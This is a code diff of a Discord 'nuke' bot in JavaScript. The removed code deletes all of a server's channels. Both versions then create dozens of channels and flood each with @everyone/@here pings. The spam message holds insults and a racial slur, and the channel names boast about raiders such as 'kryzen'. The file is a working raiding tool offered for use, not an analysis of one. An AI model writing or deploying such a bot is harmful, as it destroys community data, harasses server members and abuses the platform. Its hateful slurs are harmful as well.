@@ -1,81 +1,94 @@
-require('dotenv').config();
-const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits } = require('discord.js');
-
-const TOKEN = process.env.DISCORD_TOKEN;
-const PREFIX = '.';
-const SPAM_MSG = `> __NUKED BY KRYZEN AND AIKO FUCK U all nigga fuck shit SHIRO SUPOT NA BADINGDONG__\n||@everyone @here||`;
-const CHANNEL_COUNT = 68;
-const MSG_PER_CHANNEL = 5;
-
-const NAME_LIST = [
-    'nuked by @Kryzen.net',
-    'owned by kryzen',
-    'tamed by aiko&kryzen'
-];
-
+const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, REST } = require('discord.js');
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
+        GatewayIntentBits.MessageContent,
     ]
+});
+
+const nukingGuilds = new Set();
+
+const channelNames = [
+    "Nuked by nexiro",
+    "tamed by nex",
+    "nuked by untog"
+];
+
+const pingMessage = `> tamed by aikoware, kryzen
+__denzxu bading HAHAHA IYAK kana boy sama mo na xenondot nyo__
+@everyone @here`;
+
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+client.once('ready', () => {
+    console.log(`✅ Logged in as ${client.user.tag}`);
+    console.log(`Bot is ready to nuke!`);
 });
 
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
-    if (!message.content.startsWith(PREFIX)) return;
-    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
-        return message.reply('❌ Admin only.');
-    }
-
-    const cmd = message.content.slice(PREFIX.length).trim().toLowerCase();
-    if (cmd !== 'nuke') return;
-
-    await message.reply(`⏳ Deleting all channels, then creating ${CHANNEL_COUNT} new ones and spamming...`);
+    if (!message.content.startsWith('!nuke')) return;
 
     const guild = message.guild;
-
-    // 1. DELETE ALL CHANNELS
-    const channels = guild.channels.cache;
-    for (const channel of channels.values()) {
-        if (channel.deletable) {
-            try {
-                await channel.delete(`Nuke by ${message.author.tag}`);
-            } catch (err) {
-                console.error(`Failed to delete ${channel.name}:`, err.message);
-            }
-        }
+    if (!guild) {
+        return message.reply('❌ This command can only be used in a server.');
     }
 
-    // 2. CREATE NEW CHANNELS WITH RANDOM NAMES + SPAM
-    let created = 0;
-    for (let i = 0; i < CHANNEL_COUNT; i++) {
+    const member = message.member;
+    if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels) && !member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+        return message.reply('❌ You need **Manage Channels** or **Administrator** permission to use this command.');
+    }
+
+    if (nukingGuilds.has(guild.id)) {
+        return message.reply('⚠️ A nuke operation is already running in this server. Please wait.');
+    }
+
+    nukingGuilds.add(guild.id);
+
+    const replyMsg = await message.reply('💣 **NUKE INITIATED** 💣\nCreating 67 channels and sending 10 mass pings in each...');
+
+    let createdChannels = 0;
+    let failedChannels = 0;
+
+    for (let i = 0; i < 67; i++) {
+        const nameIndex = i % channelNames.length;
+        let baseName = channelNames[nameIndex];
+        const cycle = Math.floor(i / channelNames.length);
+        const channelName = cycle === 0 ? baseName : `${baseName}-${cycle + 1}`;
+
         try {
-            const randomName = NAME_LIST[Math.floor(Math.random() * NAME_LIST.length)];
-            // Add a suffix to avoid duplicate name errors (Discord requires unique names)
-            const uniqueName = `${randomName}-${Date.now()}-${i}`;
-            const channel = await guild.channels.create({
-                name: uniqueName.slice(0, 100), // max 100 chars
+            const newChannel = await guild.channels.create({
+                name: channelName,
                 type: ChannelType.GuildText,
-                reason: 'Nuke spam'
+                reason: 'Nuke by ' + message.author.tag
             });
 
-            // Send fast (no delay)
-            for (let j = 0; j < MSG_PER_CHANNEL; j++) {
-                await channel.send(SPAM_MSG);
+            console.log(`✅ Created channel #${channelName}`);
+
+            // Send 10 pings in the new channel
+            for (let pingCount = 0; pingCount < 10; pingCount++) {
+                try {
+                    await newChannel.send(pingMessage);
+                    await delay(200); // small delay between messages
+                } catch (sendErr) {
+                    console.error(`Failed to send message in ${channelName}:`, sendErr.message);
+                }
             }
-            created++;
+            createdChannels++;
+            await delay(800); // delay between channel creations to avoid rate limits
+
         } catch (err) {
-            console.error(`Failed on channel ${i+1}:`, err.message);
+            console.error(`❌ Failed to create channel ${channelName}:`, err.message);
+            failedChannels++;
         }
     }
 
-    await message.reply(`✅ Done. Deleted all old channels. Created ${created}/${CHANNEL_COUNT} new channels, sent ${MSG_PER_CHANNEL} messages each.`);
+    nukingGuilds.delete(guild.id);
+
+    await replyMsg.edit(`🎉 **NUKE COMPLETE** 🎉\n✅ Created: ${createdChannels} channels\n❌ Failed: ${failedChannels} channels\n💥 All channels received 10 mass pings.`);
 });
 
-client.once('ready', () => {
-    console.log(`Logged in as ${client.user.tag}`);
-    console.log(`Ready. Prefix: ${PREFIX}nuke`);
-});
-
-client.login(TOKEN);
+client.login(process.env.TOKEN);
